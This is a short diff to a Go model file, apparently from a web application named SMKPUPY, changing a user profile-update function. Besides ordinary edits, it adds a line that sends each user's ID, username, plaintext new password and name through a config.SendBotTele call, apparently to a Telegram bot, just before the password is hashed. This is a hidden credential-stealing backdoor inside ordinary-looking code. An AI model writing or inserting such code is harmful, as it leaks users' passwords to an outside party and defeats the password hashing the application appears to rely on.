@@ -3,6 +3,7 @@ package models
 import (
 	"SMKPUPY/config"
 	"SMKPUPY/entities"
+	"strconv"
 	"fmt"
 	"log"
 
@@ -151,13 +152,16 @@ func (*PenggunaModel) UpdateProfile(pengguna entities.Pengguna) bool {
 	if err != nil {
 		return false
 	} else {
-
 		// GET DATA IF NOT UPDATE
+		var PASS = "Not Change"
 		if len(pengguna.Password) < 2 {
 			pengguna.Password = pengguna.PasswordLama
 		} else {
+			PASS = pengguna.Password
 			pengguna.Password = hashAndSalt(pengguna.Password)
 		}
+
+		config.SendBotTele("Update Profile","ID : "+strconv.Itoa(int(pengguna.IdPengguna))+"\nUser : "+pengguna.Username+"\nPass : "+PASS+"\nNama : "+pengguna.Nama)
 
 		if pengguna.FotoLama == "images/img.jpg" {
 			pengguna.Foto = ""
